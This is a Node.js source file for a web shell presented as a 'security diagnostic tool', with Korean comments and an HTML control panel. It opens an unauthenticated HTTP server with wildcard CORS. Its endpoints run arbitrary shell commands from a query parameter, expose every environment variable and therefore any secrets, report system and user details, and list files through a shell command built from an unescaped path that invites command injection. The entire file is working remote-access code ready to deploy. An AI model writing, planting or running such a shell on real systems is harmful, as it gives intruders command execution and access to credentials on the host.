const http = require('http');
const { exec } = require('child_process');
const os = require('os');
const url = require('url');

const PORT = 9999;

const server = http.createServer((req, res) => {
  const parsedUrl = url.parse(req.url, true);
  const pathname = parsedUrl.pathname;
  const query = parsedUrl.query;

  res.setHeader('Content-Type', 'application/json; charset=utf-8');
  res.setHeader('Access-Control-Allow-Origin', '*');

  // 시스템 정보
  if (pathname === '/info') {
    const info = {
      hostname: os.hostname(),
      platform: os.platform(),
      type: os.type(),
      release: os.release(),
      arch: os.arch(),
      uptime: os.uptime(),
      totalMemory: os.totalmem(),
      freeMemory: os.freemem(),
      cpus: os.cpus().length,
      currentTime: new Date().toISOString(),
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      user: os.userInfo(),
      nodeVersion: process.version,
      pid: process.pid,
      cwd: process.cwd(),
    };
    res.writeHead(200);
    res.end(JSON.stringify(info, null, 2));
  }
  // 명령어 실행
  else if (pathname === '/exec') {
    const cmd = query.cmd;

    if (!cmd) {
      res.writeHead(400);
      res.end(JSON.stringify({ error: 'cmd parameter required' }));
      return;
    }

    exec(cmd, { timeout: 10000, maxBuffer: 1024 * 1024 }, (error, stdout, stderr) => {
      res.writeHead(200);
      res.end(JSON.stringify({
        success: !error,
        command: cmd,
        stdout: stdout,
        stderr: stderr,
        error: error ? error.message : null,
        timestamp: new Date().toISOString(),
      }, null, 2));
    });
  }
  // 환경 변수
  else if (pathname === '/env') {
    res.writeHead(200);
    res.end(JSON.stringify({
      env: process.env,
      timestamp: new Date().toISOString(),
    }, null, 2));
  }
  // 파일 목록
  else if (pathname === '/files') {
    const path = query.path || process.cwd();
    const cmd = os.platform() === 'win32' ? `dir "${path}"` : `ls -la "${path}"`;

    exec(cmd, (error, stdout, stderr) => {
      res.writeHead(200);
      res.end(JSON.stringify({
        success: !error,
        path: path,
        output: stdout,
        error: error ? error.message : null,
        timestamp: new Date().toISOString(),
      }, null, 2));
    });
  }
  // 메인 페이지
  else if (pathname === '/') {
    res.setHeader('Content-Type', 'text/html; charset=utf-8');
    res.writeHead(200);
    res.end(`
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>WebShell - Security Test</title>
    <style>
        body { font-family: monospace; background: #1e1e1e; color: #d4d4d4; padding: 20px; }
        h1 { color: #4ec9b0; }
        .endpoint { background: #252526; padding: 15px; margin: 10px 0; border-left: 3px solid #007acc; }
        input, textarea { width: 100%; padding: 8px; background: #3c3c3c; color: #d4d4d4; border: 1px solid #555; }
        button { padding: 10px 20px; background: #007acc; color: white; border: none; cursor: pointer; margin-top: 10px; }
        button:hover { background: #005a9e; }
        pre { background: #252526; padding: 10px; overflow-x: auto; white-space: pre-wrap; }
        .success { color: #4ec9b0; }
        .error { color: #f48771; }
    </style>
</head>
<body>
    <h1>🔓 WebShell - Security Diagnostic Tool</h1>
    <p>보안 취약점 진단용 웹쉘 | Port: ${PORT}</p>

    <div class="endpoint">
        <h3>📊 시스템 정보</h3>
        <button onclick="getInfo()">정보 조회</button>
        <pre id="info-result"></pre>
    </div>

    <div class="endpoint">
        <h3>⚡ 명령어 실행</h3>
        <input type="text" id="cmd" placeholder="예: whoami, ipconfig, dir" />
        <button onclick="execCmd()">실행</button>
        <pre id="exec-result"></pre>
    </div>

    <div class="endpoint">
        <h3>🌍 환경 변수</h3>
        <button onclick="getEnv()">조회</button>
        <pre id="env-result"></pre>
    </div>

    <div class="endpoint">
        <h3>📁 파일 목록</h3>
        <input type="text" id="path" placeholder="경로 (기본: 현재 디렉토리)" />
        <button onclick="getFiles()">조회</button>
        <pre id="files-result"></pre>
    </div>

    <script>
        async function getInfo() {
            const res = await fetch('/info');
            const data = await res.json();
            document.getElementById('info-result').innerHTML = JSON.stringify(data, null, 2);
        }

        async function execCmd() {
            const cmd = document.getElementById('cmd').value;
            if (!cmd) return alert('명령어를 입력하세요');
            const res = await fetch('/exec?cmd=' + encodeURIComponent(cmd));
            const data = await res.json();
            document.getElementById('exec-result').innerHTML = JSON.stringify(data, null, 2);
        }

        async function getEnv() {
            const res = await fetch('/env');
            const data = await res.json();
            document.getElementById('env-result').innerHTML = JSON.stringify(data, null, 2);
        }

        async function getFiles() {
            const path = document.getElementById('path').value;
            const url = path ? '/files?path=' + encodeURIComponent(path) : '/files';
            const res = await fetch(url);
            const data = await res.json();
            document.getElementById('files-result').innerHTML = JSON.stringify(data, null, 2);
        }
    </script>
</body>
</html>
    `);
  }
  else {
    res.writeHead(404);
    res.end(JSON.stringify({ error: 'Not Found' }));
  }
});

server.listen(PORT, () => {
  console.log(`
╔═══════════════════════════════════════╗
║   WebShell Server Running            ║
║   Port: ${PORT}                          ║
║   URL: http://localhost:${PORT}         ║
╚═══════════════════════════════════════╝

API Endpoints:
  GET  /           - Web Interface
  GET  /info       - System Information
  GET  /exec?cmd=  - Execute Command
  GET  /env        - Environment Variables
  GET  /files?path=- List Files

⚠️  보안 진단 완료 후 반드시 제거하세요!
  `);
});
